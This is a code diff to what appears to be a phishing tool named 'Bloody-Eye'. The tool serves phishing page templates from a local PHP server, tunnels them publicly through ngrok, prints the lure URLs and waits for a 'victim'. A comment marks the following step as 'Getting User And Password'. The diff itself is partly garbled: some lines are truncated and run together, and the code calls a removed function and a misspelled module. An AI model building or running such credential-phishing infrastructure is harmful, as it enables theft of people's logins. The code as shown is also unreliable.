@@ -542,10 +542,12 @@ exit();""")
     print(Fore.RED+" ["+Fore.WHITE+"O1"+Fore.RED+"]"+" Localhost")
     print(Fore.RED+" ["+Fore.WHITE+"02"+Fore.RED+"]"+" Ngorok.io")
     print("")
-    def phpserver():
-       with open("log","w") as phplog:
-          Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
-
+    def ngrokserver():
+       with open("log","w") as phplog:                                                     Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phish$
+       bannner.banner()
+       global token
+       a = ngrok.connect(6060,"http",auth_token=token)                                  print("\n"+Fore.RED+" [~] URL 1 : "+Fore.BLUE+str(a).replace('"','').repl$
+       print("\n"+Fore.RED+" [~] URL 2 : "+Fore.BLUE+str(a).replace('"','').repl$
     v = input(Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+Fore.CYAN+" Select a Port Forwarding Service : ")
     if v == "01":
       phpserver()
@@ -556,10 +558,7 @@ exit();""")
       time.sleep(0.07)
       print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Waiting For Victim ! ! !")
     elif v == "02":
-       phpserver()
-       global token
-       link = ngrok.connect(6060,"http",auth_token=token)
-       print(Fore.GREEN+" [+]"+Fore.WHITE+str(link).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
+       ngrokserver()
 
        
  # Getting User And Password
